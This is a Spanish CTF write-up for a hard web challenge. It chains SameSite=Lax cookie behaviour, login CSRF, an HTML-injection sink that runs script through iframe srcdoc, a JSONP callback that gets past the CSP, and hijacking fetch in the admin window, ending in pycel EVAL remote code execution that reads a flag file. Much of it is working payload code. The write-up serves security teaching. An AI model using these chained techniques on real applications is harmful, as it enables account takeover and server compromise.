# Sheets — Writeup (web, Hard, 490 pts, 2 solves)

**Flag:** `flag{351e411d611fdab4}`

## TL;DR

Una SPA de hojas de cálculo (Svelte + RevoGrid) con RCE por fórmulas `pycel` detrás de una
`api_write_key` que solo un admin puede leer. Para conseguir la key hay que ejecutar JS en el
origen de un bot admin. La cadena:

1. Abrir `/#/sheets` en una ventana → el bot carga como **admin** (su cookie es `SameSite=Lax`,
   viaja en navegaciones top-level GET) → el SPA cachea `appState.key` (la `api_write_key`).
2. **Login CSRF** cross-site → el bot adopta nuestra sesión *guest* con un `username` malicioso.
3. El sink `{@html}` en Profile Settings renderiza nuestro `username` → inyectamos un
   **`<iframe srcdoc>`** que carga el **gadget JSONP** `/api/whoami/jsonp?callback=<JS>;//`
   (bypass de `script-src 'self'`) → **ejecución de JS en el origen del reto**.
4. Ese JS **secuestra el `fetch` de la ventana admin** para inyectar la fórmula RCE y dispara su
   botón *Save* → `POST /api/sheets` con la **key admin cacheada**.
5. `GET /api/sheets` evalúa `=EVAL("__import__('os').popen('cat /app/flag*.txt').read()")` → flag.

## Recon

La app (FastAPI + Starlette) sirve una SPA. Endpoints relevantes (`src/api.py`):

- `GET /api/whoami` → `{username, role}` de la sesión (cookie `token`).
- `POST /api/whoami` → cambia el `username` de la sesión. **Bloquea si `role == "admin"`.**
- `GET /api/key` (`MustBeAdmin`) → devuelve la `api_write_key`. Requiere `username=="admin" && role=="admin"`.
- `POST /api/sheets` (`MustLogin` + `APIKey`) → escribe la hoja. **Solo exige estar logueado
  (guest sirve) + el header `X-API-Key` correcto.** No exige sesión admin.
- `GET /api/sheets` → evalúa la hoja con **pycel** y devuelve los valores.
- `GET /api/whoami/jsonp?callback=X` → `PlainTextResponse(X + "(" + whoami_json + ")")`.
- `GET /report?url=...` → un bot headless (Playwright) visita la URL con la cookie admin.

**Cookie del bot** (`src/bot.py`): `token = <admin_session_id>`, para host `127.0.0.1`,
**sin `httpOnly`** y **`SameSite=Lax`** (Playwright `add_cookies` sin `sameSite`).

**CSP** (`src/main.py`): `default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'`
en todo salvo `/(api|docs|redoc)` y salvo cuando `Host == hook.pwn:5000`.

### La RCE (pycel `EVAL`)

`post_sheets` hace `excel.set_value("Sheet1!A2:F16", rows)` y luego `GET` evalúa con pycel.
pycel emite el nombre de función `EVAL` como identificador Python crudo y lo resuelve en el
namespace de `exec`, donde `eval` es builtin. Así `=EVAL("<python>")` ejecuta Python.

Detalles finos:
- La fórmula debe ir en **E2** con `A2:D2 = 0`. Las columnas E/F tienen un loop que pone
  `E=AVERAGE(A:D)`, `F=SQRT(E)`; con A:D=0 ese loop no toca E2 y respeta nuestra fórmula.
- Hay que hacer `GET /api/sheets` **antes** del `POST` para poblar el `cell_map` de pycel.

## El muro: conseguir la `api_write_key`

`GET /api/key` exige admin. No podemos ser admin. Pero **`POST /api/sheets` no exige admin**,
solo la key en el header. Y el SPA, al cargar `/#/sheets` **como admin**, guarda la key en
`appState.key` (memoria JS). Entonces: si logramos ejecutar JS en el origen del reto teniendo
una ventana admin viva, podemos reutilizar esa key.

### ¿Por qué no cookie tossing / self-XSS directo?

- **Starlette lee la ÚLTIMA cookie duplicada** (`cookie_parser`: `dict[key]=val` en loop). Por
  RFC 6265 §5.4 el navegador envía primero las de path más largo; la cookie admin está en `path=/`
  (la más corta) → se envía última → **siempre gana**. Cookie tossing para degradar a guest en
  `/api/whoami` es imposible.
- El `username` de admin es **inmutable** (`POST /api/whoami` bloquea admin), así que el `{@html}`
  renderizando la sesión admin nunca inyecta.
- `<script>` inyectado por `innerHTML` (que es lo que hace `{@html}`) **no ejecuta**; los handlers
  inline (`<img onerror>`) los mata la CSP.

## La cadena que sí funciona

### 1) Ventana admin que cachea la key

```js
const w1 = window.open('http://127.0.0.1:5000/#/sheets', 'victim');
```
Navegación **top-level GET** cross-site → la cookie `Lax` admin **sí** viaja → `w1` carga como
admin → `SheetPage` hace `fetch('/api/key')` → `appState.key = <api_write_key>` (en memoria de `w1`).

### 2) Login CSRF: el bot adopta nuestra sesión guest

En otra ventana `w2`, en secuencia:
```js
w2.location = A + '/api/logout';           // borra la cookie admin
// POST /api/whoami vía form text/plain que arma un JSON:
//   name = {"new_username":"<PAYLOAD>","z":"   value = "}
//   body = name + "=" + value = {"new_username":"<PAYLOAD>","z":"="}
form.submit();                              // crea sesión guest con NUESTRO username
w2.location = A + '/#/settings';            // renderiza el username
```
Un **POST top-level cross-site sí almacena el `Set-Cookie`** de la sesión guest (SameSite solo
gobierna el envío, no el almacenamiento). La cookie del jar compartido pasa a guest, pero `w1`
está idle en `/#/sheets` y conserva `appState.key` (no recarga).

### 3) `{@html}` → `<iframe srcdoc>` → JSONP → ejecución de JS

`ProfileSettingsPage.svelte`:
```svelte
{@html `<textarea ...>${JSON.stringify(appState.whoami,undefined,2).replace("<","")}</textarea>`}
```
Renderiza nuestro `username`. `.replace("<","")` solo quita el **primer** `<` (usamos uno de
sacrificio). Payload:
```
<z</textarea><iframe srcdoc='<script src=/api/whoami/jsonp?callback=<ENC>></script>'></iframe>
```
- `<iframe srcdoc>` es **parser-inserted** → sus scripts **sí ejecutan** (a diferencia de
  `innerHTML`). El iframe hereda origen (`about:srcdoc` = `127.0.0.1`) y la CSP `script-src 'self'`.
- `<script src=/api/whoami/jsonp?callback=...>` es **same-origin** → permitido por `'self'`.
- El JSONP refleja el callback: `callback(<whoami_json>)`. Para que ejecute sin error de sintaxis
  usamos el truco **`callback = <código>;//`** → la respuesta queda `<código>;//(<json>)`, con el
  `(<json>)` comentado.

### 4) Secuestrar el `fetch` de la ventana admin + disparar Save

El JS del JSONP corre en el origen del reto. Accede a la ventana admin por nombre y le secuestra
`fetch` para inyectar la fórmula en el `POST /api/sheets`, luego click en Save:
```js
var W = open('', 'victim');                 // la ventana admin (mismo origen)
var F = W.fetch.bind(W);
W.fetch = function(u, o){
  if ((''+u).indexOf('/api/sheets')>=0 && o && o.method=='POST'){
    var rows = [[0,0,0,0, "=EVAL(\"__import__('os').popen('cat /app/flag*.txt').read()\")", 0]];
    for (var i=0;i<14;i++) rows.push([0,0,0,0,0,0]);
    o.body = JSON.stringify({header:['a','b','c','d','e','f'], rows:rows});
  }
  return F(u, o);
};
W.document.querySelector('button').click(); // handleColumnUpdate -> POST con appState.key (admin)
```
El `POST` sale con `X-API-Key: appState.key` (la key admin cacheada) + cookie guest → **200**
(porque `POST /api/sheets` = `MustLogin` + `APIKey`, no requiere sesión admin).

### 5) Leer la flag

```
GET /api/sheets  → pycel evalúa E2 → RCE → cat /app/flag*.txt → flag{351e411d611fdab4}
```

## Detalle que casi lo tumba

El payload contiene `</script>` (el cierre del `<script>` interno del iframe). Puesto **inline**
en el `<script>` de la página atacante, ese `</script>` **cierra prematuramente el script del
atacante** → error de sintaxis → `window.open` nunca corre. Solución: **codificar el payload en
base64** y decodificarlo con `atob()`, así no aparece `</script>` literal en el HTML.

## Delivery en producción

`/report` recibe una URL externa. Se hostea la página atacante en un sitio público (túnel a un
servidor local) cuyo JS opera contra `http://127.0.0.1:5000` (que dentro del contenedor del bot
ES la app). Tras reportarla, el bot ejecuta la cadena y escribe la fórmula; nosotros hacemos
`GET https://<host>/api/sheets` → flag.

## Exploit

Ver `solve/prod_exploit.py` (genera la página atacante y lee la flag).

## Conceptos clave

- **`SameSite=Lax` ≠ `Strict`**: la cookie admin viaja en navegaciones top-level GET → una
  `window.open` la usa. Esto es lo que hace viable la ventana admin (`w1`).
- **Login CSRF**: un POST top-level cross-site almacena el `Set-Cookie` sin importar SameSite.
- **`<iframe srcdoc>` ejecuta scripts** (parser-inserted) donde `innerHTML` no.
- **JSONP como bypass de `script-src 'self'`**: un endpoint que refleja el callback es un script
  same-origin controlado por el atacante (`callback;//`).
- **`POST /api/sheets` no exige admin, solo la key** → basta reusar la key admin cacheada por el SPA.
- **pycel `=EVAL(...)`** → RCE.
